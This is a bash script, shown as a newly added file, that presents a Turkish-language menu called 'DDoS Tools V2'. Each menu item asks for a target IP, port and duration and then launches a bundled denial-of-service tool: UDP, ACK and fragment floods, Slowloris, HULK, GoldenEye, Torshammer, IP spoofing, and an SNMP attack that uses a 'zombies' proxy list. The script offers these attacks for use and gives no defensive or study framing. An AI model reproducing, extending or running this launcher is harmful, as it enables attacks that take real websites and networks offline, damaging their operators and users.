@@ -1,0 +1,415 @@
+#!/bin/bash
+BLACK='\e[0;30m'
+BLUE='\e[0;34m'
+GREEN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+PURPLE='\e[0;35m'
+BROWN='\e[0;33m'
+LIGHTGRAY='\e[0;37m'
+DARKGRAY='\e[1;30m'
+LIGHTBLUE='\e[1;34m'
+LIGHTGREEN='\e[1;32m'
+LIGHTCYAN='\e[1;36m'
+LIGHTRED='\e[1;31m'
+LIGHTPURPLE='\e[1;35m'
+YELLOW='\e[1;33m'
+WHITE='\e[1;37m'
+NC='\e[0m'             
+
+exit_script()
+{
+  ./DDoS-Tool-V2
+}
+
+Twiks()
+{
+    clear
+    echo -e " ${BLUE} "                                         
+    echo -e "             ${CYAN}████████╗██╗    ██╗██╗██╗  ██╗███████╗ "   
+    echo -e "             ${CYAN}╚══██╔══╝██║    ██║██║██║ ██╔╝██╔════╝ "   
+    echo -e "             ${CYAN}   ██║   ██║ █╗ ██║██║█████╔╝ ███████╗ "   
+    echo -e "             ${CYAN}   ██║   ██║███╗██║██║██╔═██╗ ╚════██║ "   
+    echo -e "             ${CYAN}   ██║   ╚███╔███╔╝██║██║  ██╗███████║ "   
+    echo -e "             ${CYAN}   ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚══════╝ "  
+    echo "  |                            TWIKS SCRIPT                               | "
+    echo "  |-----------------------------------------------------------------------| "
+echo "HEDEF IP :"
+read ip
+echo "HEDEF PORT :"
+read port
+./Twiks $ip $port
+}
+
+udp_flood()
+{
+    clear
+    echo -e " ${BLUE} "                                                    
+    echo -e "  |     ▄• ▄▌·▄▄▄▄   ▄▄▄·    ·▄▄▄▄▄▌              ·▄▄▄▄                   |    " 
+    echo -e "  |     █▪██▌██▪ ██ ▐█ ▄█    ▐▄▄·██•  ▪     ▪     ██▪ ██                  |"
+    echo -e "  |     █▌▐█▌▐█· ▐█▌ ██▀·    ██▪ ██▪   ▄█▀▄  ▄█▀▄ ▐█· ▐█▌                 |  " 
+    echo -e "  |     ▐█▄█▌██. ██ ▐█▪·•    ██▌.▐█▌▐▌▐█▌.▐▌▐█▌.▐▌██. ██                  | "  
+    echo -e "  |      ▀▀▀ ▀▀▀▀▀• .▀       ▀▀▀ .▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀▀▀▀•                  |" 
+    echo "  |-----------------------------------------------------------------------| " 
+    echo "  |                          UDP FLOOD SCRIPT                             |"
+    echo "  |-----------------------------------------------------------------------| "
+echo "HEDEF IP :"
+read ip
+echo "PORT GIRINIZ :"
+read port
+echo "SANIYE GIRINIZ :"
+read time
+python gott.2.py $ip $port $time
+}
+
+hammer()
+{
+    clear
+    echo -e " ${WHITE}  "                                                         
+    echo -e "  ${CYAN} ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ${CYAN}     " 
+    echo -e "  ${CYAN}▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌${CYAN}     " 
+    echo -e "  ${CYAN}▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   ▐░▐░▌▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌${CYAN}     " 
+    echo -e "  ${CYAN}▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌          ▐░▌       ▐░▌${CYAN}     " 
+    echo -e "  ${CYAN}▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▐░▌ ▐░▌▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌${CYAN}     " 
+    echo -e "  ${CYAN}▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌${CYAN}     " 
+    echo -e "  ${CYAN}▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▀   ▐░▌▐░▌   ▀   ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ${CYAN}     " 
+    echo -e "  ${CYAN}▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌  ${CYAN}     " 
+    echo -e "  ${CYAN}▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ${CYAN}     " 
+    echo -e "  ${CYAN}▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌${CYAN}     " 
+    echo -e "  ${CYAN} ▀         ▀  ▀         ▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ ${CYAN}     " 
+    echo "  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+    echo "  +                        HAMMER TURBO SCRIPT                            +"
+    echo "  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+echo "HEDEF IP :"
+read ip
+echo "HEDEF PORT :"
+read port
+echo "TURBO [135] :"
+read turbo
+./hammer.py -s $ip -p $port -t $turbo
+}
+
+slowloris()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "███████╗██╗      ██████╗ ██╗    ██╗██╗      ██████╗ ██████╗ ██╗███████╗"
+    echo "██╔════╝██║     ██╔═══██╗██║    ██║██║     ██╔═══██╗██╔══██╗██║██╔════╝"
+    echo "███████╗██║     ██║   ██║██║ █╗ ██║██║     ██║   ██║██████╔╝██║███████╗"
+    echo "╚════██║██║     ██║   ██║██║███╗██║██║     ██║   ██║██╔══██╗██║╚════██║"
+    echo "███████║███████╗╚██████╔╝╚███╔███╔╝███████╗╚██████╔╝██║  ██║██║███████║"
+    echo "╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝"
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  +                          WEB DOSER SCRIPT                             + "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Menuye Geri Dönmek İcin CTRL + C Yapmaniz Yeterlidir."
+echo "HEDEF IP :"
+read host
+echo "SITE'NIN PORTU :"
+read port
+./slowloris $host $port
+}
+
+TURKBOT()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  SCRIPT ACILACAKTIR BEKLEYINIZ. EGER ACILMAZ ISE YAZILIMI TEKRAR KURUNUZ  "
+python TURKBOT.py
+}
+
+nytro()
+{
+    clear
+    echo -e " ${BLUE} "                                                
+    echo -e "  ${CYAN}  ________  ________  ________  ________  __ ______ ${CYAN}"
+    echo -e "  ${CYAN} |\   ____\|\   __  \|\   __  \|\   __  \|\  _____\ ${CYAN}"
+    echo -e "  ${CYAN} \ \  \___|\ \  \|\  \ \  \|\  \ \  \|\  \ \  \__/  ${CYAN}"
+    echo -e "  ${CYAN}  \ \_____  \ \   ____\ \  \\\  \ \  \ \  \ \   __\ ${CYAN}"
+    echo -e "  ${CYAN}   \|____|\  \ \  \___|\ \  \\\  \ \  \\\  \ \  \_| ${CYAN}"
+    echo -e "  ${CYAN}     ____\_\  \ \__\    \ \_______\ \_______\ \__\  ${CYAN}"
+    echo -e "  ${CYAN}    |\_________\|__|     \|_______|\|_______|\|__|  ${CYAN}"
+    echo -e "  ${CYAN}    \|_________| ${CYAN} " 
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "                                                     "
+    echo "  +-------------------------------------------------------------------- " 
+    echo "                          TITANIUM IP SPOOF SCRIPT        "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Enter IP Address :"
+read ip
+echo "Enter Port :"
+read port
+echo "Enter size :"
+read size
+echo "Enter the time in seconds :"
+read time
+perl nytro.pl $ip $port $size $time
+
+}
+
+goldeneye()
+{
+    clear
+    echo -e " ${RED}  "
+    echo "             DIAMOND GOLDENEYE SCRIPT  "   
+    echo "     "
+    echo ""	
+    echo -e "  ${CYAN}  ▄▀  ████▄ █     ██▄   ▄███▄      ▄   ▄███▄ ▀▄    ▄ ▄███▄  " 
+    echo -e "  ${CYAN}▄▀    █   █ █     █  █  █▀   ▀      █  █▀   ▀  █  █  █▀   ▀  "
+    echo -e "  ${CYAN}█ ▀▄  █   █ █     █   █ ██▄▄    ██   █ ██▄▄     ▀█   ██▄▄    "
+    echo -e "  ${CYAN}█   █ ▀████ ███▄  █  █  █▄   ▄▀ █ █  █ █▄   ▄▀  █    █▄   ▄▀ "
+    echo -e "  ${CYAN} ███            ▀ ███▀  ▀███▀   █  █ █ ▀███▀  ▄▀     ▀███▀   "
+    echo -e "  ${CYAN}                                █   ██                       "
+    echo ""
+    echo "                "
+    echo ""
+echo "HEDEF SITE :"
+read host
+
+./goldeneye.py $host -w 99 -s 999
+}
+
+torshammer()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e "${RED}▄▄▄▄▄      ▄▄▄  .▄▄ ·  ▄ .▄ ▄▄▄· • ▌ ▄ ·. • ▌ ▄ ·. ▄▄▄ .▄▄▄  "
+	echo "•██  ▪     ▀▄ █·▐█ ▀. ██▪▐█▐█ ▀█ ·██ ▐███▪·██ ▐███▪▀▄.▀·▀▄ █·"
+	echo " ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄▀▀▀█▄██▀▐█▄█▀▀█ ▐█ ▌▐▌▐█·▐█ ▌▐▌▐█·▐▀▀▪▄▐▀▀▄ "
+	echo " ▐█▌·▐█▌.▐▌▐█•█▌▐█▄▪▐███▌▐▀▐█ ▪▐▌██ ██▌▐█▌██ ██▌▐█▌▐█▄▄▌▐█•█▌"
+	echo " ▀▀▀  ▀█▄▀▪.▀  ▀ ▀▀▀▀ ▀▀▀ · ▀  ▀ ▀▀  █▪▀▀▀▀▀  █▪▀▀▀ ▀▀▀ .▀  ▀"
+	echo " "
+    echo -e "   ${YELLOW}                                        "
+echo "HEDEF ? "
+read hedef
+echo "PORT  ? "
+read port
+echo "PACKET SAYISI ? "
+read packet
+python torshammer.py -t $hedef -p $port -r $packet
+}
+
+bots()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e "${RED}                        ▄▄▄▄·       ▄▄▄▄▄.▄▄ · "
+    echo -e "${RED}                        ▐█ ▀█▪▪     •██  ▐█ ▀. "
+    echo -e "${RED}                        ▐█▀▀█▄ ▄█▀▄  ▐█.▪▄▀▀▀█▄"
+    echo -e "${RED}                        ██▄▪▐█▐█▌.▐▌ ▐█▌·▐█▄▪▐█"
+    echo -e "${RED}                        ·▀▀▀▀  ▀█▄▀▪ ▀▀▀  ▀▀▀▀  "
+	echo "                                         "
+python Bots.py
+}
+
+ipspoof()
+{
+    clear
+python ip-spoof.py
+}
+
+
+hulk()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e "${WHITE}   ▄█    █▄    ███    █▄   ▄█          ▄█   ▄█▄ "
+    echo -e "${WHITE}  ███    ███   ███    ███ ███         ███ ▄███▀ "
+    echo -e "${WHITE}  ███    ███   ███    ███ ███         ███▐██▀   "
+    echo -e "${WHITE} ▄███▄▄▄▄███▄▄ ███    ███ ███        ▄█████▀    "
+    echo -e "${WHITE}▀▀███▀▀▀▀███▀  ███    ███ ███       ▀▀█████▄    "
+    echo -e "${WHITE}  ███    ███   ███    ███ ███         ███▐██▄   "
+    echo -e "${WHITE}  ███    ███   ███    ███ ███▌    ▄   ███ ▀███▄ "
+    echo -e "${WHITE}  ███    █▀    ████████▀  █████▄▄██   ███   ▀█▀ "
+    echo -e "${WHITE}                           ▀           ▀         "
+	echo -e "                             ${BLUE}            "
+echo "HEDEF ? "
+read hedef
+python hulk.py $hedef
+}
+
+snmp()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e "${WHITE}   ▄████████ ███▄▄▄▄     ▄▄▄▄███▄▄▄▄      ▄███████▄ "
+    echo -e "${WHITE}  ███    ███ ███▀▀▀██▄ ▄██▀▀▀███▀▀▀██▄   ███    ███ "
+    echo -e "${WHITE}  ███    █▀  ███   ███ ███   ███   ███   ███    ███ "
+    echo -e "${WHITE}  ███        ███   ███ ███   ███   ███   ███    ███ "
+    echo -e "${WHITE}▀███████████ ███   ███ ███   ███   ███ ▀█████████▀  "
+    echo -e "${WHITE}         ███ ███   ███ ███   ███   ███   ███      "  
+    echo -e "${WHITE}   ▄█    ███ ███   ███ ███   ███   ███   ███    "    
+    echo -e "${WHITE} ▄████████▀   ▀█   █▀   ▀█   ███   █▀   ▄████▀  "   
+	echo -e "                             ${BLUE}            "
+echo "HEDEF IP "
+read ip
+echo "PROXY LIST ? /root/Desktop/zombies.txt "
+read bot
+echo "THREADS ? "
+read pack
+python snmp.py $ip $bot $pack
+}
+
+slowloris2()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e "${LIGHTGREEN}███████╗██╗      ██████╗ ██╗    ██╗██╗      ██████╗ ██████╗ ██╗███████╗"
+    echo -e "${WHITE}██╔════╝██║     ██╔═══██╗██║    ██║██║     ██╔═══██╗██╔══██╗██║██╔════╝"
+    echo -e "${LIGHTGREEN}███████╗██║     ██║   ██║██║ █╗ ██║██║     ██║   ██║██████╔╝██║███████╗"
+    echo -e "${WHITE}╚════██║██║     ██║   ██║██║███╗██║██║     ██║   ██║██╔══██╗██║╚════██║"
+    echo -e "${LIGHTGREEN}███████║███████╗╚██████╔╝╚███╔███╔╝███████╗╚██████╔╝██║  ██║██║███████║"
+    echo -e "${WHITE}╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝"
+    echo -e "${WHITE}                                                                       "   
+    echo -e "                             ${BLUE}            "
+echo "HEDEF ? "
+read host
+perl slowloris.pl -dns $host
+}
+
+rand()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e "${LIGHTGREEN}	██████╗  █████╗ ███╗   ██╗██████╗ "
+    echo -e "${LIGHTGREEN}	██╔══██╗██╔══██╗████╗  ██║██╔══██╗"
+    echo -e "${LIGHTGREEN}	██████╔╝███████║██╔██╗ ██║██║  ██║"
+    echo -e "${LIGHTGREEN}	██╔══██╗██╔══██║██║╚██╗██║██║  ██║"
+    echo -e "${LIGHTGREEN}	██║  ██║██║  ██║██║ ╚████║██████╔╝"
+    echo -e "${LIGHTGREEN}	╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ "
+    echo -e "${LIGHTGREEN}"                                 
+    echo -e "${BLUE}"
+echo "HEDEF IP & URL ? "
+read host
+echo "SANIYE ? "
+read time
+perl rand.pl $host $time
+}
+
+ack()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e "${LIGHTGREEN}	   ▄████████  ▄████████    ▄█   ▄█▄    "
+    echo -e "${LIGHTGREEN}	     ███    ███ ███    ███   ███ ▄███▀ "
+    echo -e "${LIGHTGREEN}	     ███    ███ ███    █▀    ███▐██▀   "
+    echo -e "${LIGHTGREEN}	     ███    ███ ███         ▄█████▀    "
+    echo -e "${LIGHTGREEN}	   ▀███████████ ███        ▀▀█████▄    "
+    echo -e "${LIGHTGREEN}	     ███    ███ ███    █▄    ███▐██▄   "
+    echo -e "${LIGHTGREEN}	     ███    ███ ███    ███   ███ ▀███▄ "
+    echo -e "${LIGHTGREEN}	     ███    █▀  ████████▀    ███   ▀█▀ "
+    echo -e "${LIGHTGREEN}	                             ▀         "
+    echo -e "${LIGHTGREEN}"                                 
+    echo -e "${BLUE}"
+echo "HEDEF IP ? "
+read ip
+echo "PORT ? "
+read port
+echo "TIME ? "
+read time
+./ack $ip $port $time
+}
+
+frag()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e "${LIGHTGREEN}	    ▄████████    ▄████████    ▄████████    ▄██████▄     "
+    echo -e "${LIGHTGREEN}	     ███    ███   ███    ███   ███    ███   ███   ███ "
+    echo -e "${LIGHTGREEN}	     ███    █▀    ███    ███   ███    ███   ███    █▀  "
+    echo -e "${LIGHTGREEN}	    ▄███▄▄▄      ▄███▄▄▄▄██▀   ███    ███  ▄███        "
+    echo -e "${LIGHTGREEN}	   ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███ ████▄  "
+    echo -e "${LIGHTGREEN}	     ███        ▀███████████   ███    ███   ███    ███ "
+    echo -e "${LIGHTGREEN}	     ███          ███    ███   ███    ███   ███    ███ "
+    echo -e "${LIGHTGREEN}	     ███          ███    ███   ███    █▀    ████████▀  "
+    echo -e "${LIGHTGREEN}	                  ███    ███                           "
+    echo -e "${LIGHTGREEN}"                                 
+    echo -e "${BLUE}"
+echo "HEDEF IP :"
+read ip
+echo "PACKET ?"
+read pack
+./frag $ip $pack
+}
+
+exit_script1()
+{
+  exit 1
+}
+
+Take_input1()
+{
+clear
+chmod 777 *
+chmod +x *
+while :
+do
+clear
+echo " "
+echo -e "${YELLOW}     █████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗██╗██╗      █████╗ ██████╗ "
+echo -e "${YELLOW}    ██╔══██╗██║ ██╔╝██║████╗  ██║██╔════╝██║██║     ██╔══██╗██╔══██╗"
+echo -e "${YELLOW}    ███████║█████╔╝ ██║██╔██╗ ██║██║     ██║██║     ███████║██████╔╝"
+echo -e "${YELLOW}    ██╔══██║██╔═██╗ ██║██║╚██╗██║██║     ██║██║     ██╔══██║██╔══██╗"
+echo -e "${YELLOW}    ██║  ██║██║  ██╗██║██║ ╚████║╚██████╗██║███████╗██║  ██║██║  ██║"
+echo -e "${YELLOW}    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝"
+echo -e "${YELLOW}                                                                    "
+echo -e "${RED}╔╦╗╔╦╗╔═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╔═╗  ██╗   ██╗██████╗"
+echo -e "${WHITE} ║║ ║║║ ║╚═╗   ║ ║ ║║ ║║  ╚═╗  ██║   ██║╚════██╗"
+echo -e "${RED}═╩╝═╩╝╚═╝╚═╝   ╩ ╚═╝╚═╝╩═╝╚═╝  ██║   ██║ █████╔╝"
+echo -e "${WHITE}                               ╚██╗ ██╔╝██╔═══╝ "
+echo -e "${RED}		                ╚████╔╝ ███████╗"
+echo -e "${WHITE}                                 ╚═══╝  ╚══════╝"                  
+echo -e "${RED}CODED BY YANLIZ KURT  [NO EDIT]"
+echo " "
+        echo -e "${WHITE}=========================================="
+	echo -e "${LIGHTBLUE}[1]${RED}Twiks${LIGHTBLUE}                                 ${WHITE}|"
+	echo -e "${LIGHTBLUE}[2]${RED}UDP FLOOD${LIGHTBLUE}                             ${WHITE}|"
+	echo -e "${LIGHTBLUE}[3]${RED}HAMMER${LIGHTBLUE}                                ${WHITE}|"
+	echo -e "${LIGHTBLUE}[4]${RED}SLOWLORIS${LIGHTBLUE}                             ${WHITE}|"
+	echo -e "${LIGHTBLUE}[5]${RED}TURKBOT${LIGHTBLUE}                               ${WHITE}|"
+	echo -e "${LIGHTBLUE}[6]${RED}GOLDENEYE${LIGHTBLUE}                             ${WHITE}|"
+	echo -e "${LIGHTBLUE}[7]${RED}FLOOD${LIGHTBLUE}                                 ${WHITE}|" 
+        echo -e "${LIGHTBLUE}[8]${RED}TORSHAMMER${LIGHTBLUE}                            ${WHITE}|"    
+        echo -e "${LIGHTBLUE}[9]${RED}BOTS SCRIPT${LIGHTBLUE}                          ${WHITE}|"
+        echo -e "${LIGHTBLUE}[10]${RED}IP SPOOF${LIGHTBLUE}                             ${WHITE}|"
+        echo -e "${LIGHTBLUE}[11]${RED}HULK${LIGHTBLUE}                                 ${WHITE}|"
+        echo -e "${LIGHTBLUE}[12]${RED}PROXY SALDIRISI [IP]${LIGHTBLUE}                 ${WHITE}| "      
+        echo -e "${LIGHTBLUE}[13]${RED}SLOWLORIS PL${LIGHTBLUE}                         ${WHITE}| "  
+        echo -e "${LIGHTBLUE}[14]${RED}RAND${LIGHTBLUE}                                 ${WHITE}|"           
+        echo -e "${LIGHTBLUE}[15]${RED}ACK${LIGHTBLUE}                                  ${WHITE}|"           
+        echo -e "${LIGHTBLUE}[16]${RED}FRAG${LIGHTBLUE}                                 ${WHITE}|"          
+        echo -e "${WHITE}==========================================${LIGHTGREEN}"
+    echo -n "Menuden Scriptleri Secebilirsiniz [1 - 16] "
+    read yourch
+    case $yourch in
+      1) Twiks ;;
+      2) udp_flood ;;
+      3) hammer ;;
+	  4) slowloris ;;
+         5) TURKBOT ;;
+		 7) nytro ;;
+	      6) goldeneye ;;
+          8) torshammer ;;
+          9) bots ;;
+	  10) ipspoof ;;
+          11) hulk ;;
+          12) snmp ;;
+	  13) slowloris2 ;;
+   	  14) rand ;;
+          15) ack ;;
+	  16) frag ;;
+      ex) echo "As you Command" ;  exit 1  ;;
+      *) echo "HATALI RAKAM GIRDINIZ" ;
+         echo "Enter Basarak Menuye Dönebilirsiniz . . ." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_input1
+#
+Take_input1
